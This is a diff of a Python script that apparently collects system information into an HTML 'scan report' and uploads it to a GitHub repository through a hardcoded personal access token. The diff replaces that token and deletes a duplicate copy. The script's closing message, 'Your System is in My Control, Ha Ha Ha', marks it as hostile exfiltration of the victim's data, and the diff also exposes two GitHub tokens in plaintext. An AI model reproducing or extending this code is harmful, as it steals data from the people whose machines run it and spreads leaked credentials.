@@ -29,7 +29,7 @@ from github import Github, InputGitTreeElement, Auth
 # -------------------------------------------------------------------
 # GITHUB CONFIGURATION
 # -------------------------------------------------------------------
-GITHUB_TOKEN = "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"
+GITHUB_TOKEN = "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"
 REPO_NAME = "amrita425/System_Scan_files"
 BRANCH = "main"
 
@@ -2007,11 +2007,6 @@ def push_to_github():
         html_content = generate_html_report()
         print("✓ HTML content generated")
 
-        # GitHub configuration
-        GITHUB_TOKEN = "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"  # MAKE SURE TO REPLACE THIS
-        REPO_NAME = "amrita425/System_Scan_files"
-        BRANCH = "main"
-
         # Create filename
         filename = f"System_Scan_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
         print(f"✓ Filename: {filename}")
@@ -2109,4 +2104,5 @@ if __name__ == "__main__":
         print("\033[96m[+] Your System is in My Control, Ha Ha Ha ...\033[0m")
     else:
         print("\033[91mFailed to push to GitHub\033[0m")
+
 
